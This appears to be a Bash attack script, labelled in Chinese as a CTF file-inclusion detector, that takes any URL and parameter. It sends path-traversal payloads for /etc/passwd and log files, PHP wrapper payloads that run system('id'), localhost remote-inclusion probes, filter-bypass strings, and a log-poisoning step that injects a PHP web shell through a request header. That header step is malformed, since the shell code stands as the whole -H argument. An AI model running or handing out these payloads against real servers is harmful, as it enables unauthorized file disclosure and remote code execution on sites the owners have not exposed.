#!/bin/bash
# CTF 文件包含检测 (LFI/RFI)
# 用法: bash lfi.sh <URL> <PARAM>

URL="${1:?用法: bash lfi.sh <URL> <PARAM>}"
PARAM="${2:-page}"

echo "=========================================="
echo "  文件包含检测: $URL ($PARAM)"
echo "=========================================="

urlencode() { /usr/bin/python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }

echo -e "\n[1/5] 基础LFI检测"
LFI_PAYLOADS=(
    "../../../../../../etc/passwd"
    "....//....//....//....//etc/passwd"
    "..%252f..%252f..%252f..%252fetc/passwd"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "php://filter/convert.base64-encode/resource=index.php"
    "/etc/passwd%00"
    "file:///etc/passwd"
    "/proc/self/environ"
    "/proc/self/cmdline"
    "/var/log/apache2/access.log"
    "/var/log/nginx/access.log"
)
for payload in "${LFI_PAYLOADS[@]}"; do
    encoded=$(urlencode "$payload")
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -qE "(root:|/bin/bash|/bin/sh|PD9waH|base64)"; then
        echo -e "  \033[31m[!] LFI成功: $payload\033[0m"
        echo "$resp" | head -5
        echo "..."
        break
    fi
done

echo -e "\n[2/5] PHP伪协议"
for proto in "php://filter/convert.base64-encode/resource=" "php://input" "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+" "zip://shell.jpg%23shell.php"; do
    encoded=$(urlencode "${proto}index.php")
    resp=$(curl -sk -X POST "$URL?$PARAM=$encoded" -d "<?php system('id');?>" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -qE "(uid=|PD9waH)"; then
        echo -e "  \033[31m[!] 伪协议可用: $proto\033[0m"
    fi
done

echo -e "\n[3/5] RFI检测"
# 内网RFI (假设attacker在10.0.0.1)
for rfi_url in "http://127.0.0.1/" "http://localhost/" "http://0.0.0.0/"; do
    encoded=$(urlencode "$rfi_url")
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    [ "$code" != "000" ] && [ "$code" != "404" ] && echo "  [?] RFI可能: $rfi_url -> $code"
done

echo -e "\n[4/5] 日志投毒"
# User-Agent注入PHP代码
curl -sk -H "<?php system(\$_GET['cmd']);?>" "$URL" --max-time 3 >/dev/null 2>&1
# 尝试包含日志
for logfile in "/var/log/apache2/access.log" "/var/log/nginx/access.log" "/var/log/httpd/access_log" "/proc/self/environ"; do
    encoded=$(urlencode "$logfile")
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$URL?$PARAM=$encoded" --max-time 3 2>/dev/null)
    [ "$code" == "200" ] && echo -e "  \033[33m[?] 日志包含可能: $logfile\033[0m"
done

echo -e "\n[5/5] str_replace绕过"
# 常见绕过: str_replace('../','') 只替换一次
for bypass in "....//....//etc/passwd" "..;/..;/etc/passwd" "..%00/..%00/etc/passwd" "..%252f..%252fetc/passwd"; do
    encoded=$(urlencode "$bypass")
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -qE "(root:|/bin/bash)"; then
        echo -e "  \033[31m[!] 绕过成功: $bypass\033[0m"
        break
    fi
done

echo -e "\n=========================================="
echo "文件包含检测完成"
echo "=========================================="
